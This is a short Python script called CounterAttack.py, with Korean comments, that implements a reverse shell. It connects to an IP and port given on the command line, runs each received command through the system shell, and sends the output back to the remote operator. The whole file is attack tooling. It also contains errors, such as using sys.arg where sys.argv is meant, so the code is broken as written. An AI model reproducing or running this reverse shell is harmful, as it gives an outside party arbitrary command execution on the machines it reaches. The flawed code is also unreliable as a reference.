import os
import socket
import sys
import subprocess

def usage():
    print('How To Use: CounterAttack.py <ip> <port>')
    exit()

if len(sys.arg) < 3:
    usage()  

s = socket.socket()
ip = sys.arg[1]
port = int(sys.arg[2])

try:
    s.connect((ip, port))
    s.send(
        b'''
        -----------------------------------
        -- Network connection successful --
        ----       It's my turn        ----
        -----------------------------------
        '''
    )

    while True:
        # 명령 수신
        command = s.recv(1024).decode().strip()
        if command.lower() == "exit":
            break

        # 명령 실행
        try:
            if os.name == 'nt':
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            else:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e: # 파이썬 버전이 3.7보다 낮을 경우 직접 텍스트 변환 후 다시 전송
            output = e.output.decode() if isinstance(e.output, bytes) else str(e.output)

        # 결과 전송
        s.send(output.encode())
except Exception as e:
    s.send(str(e).encode())
finally:
    s.close()
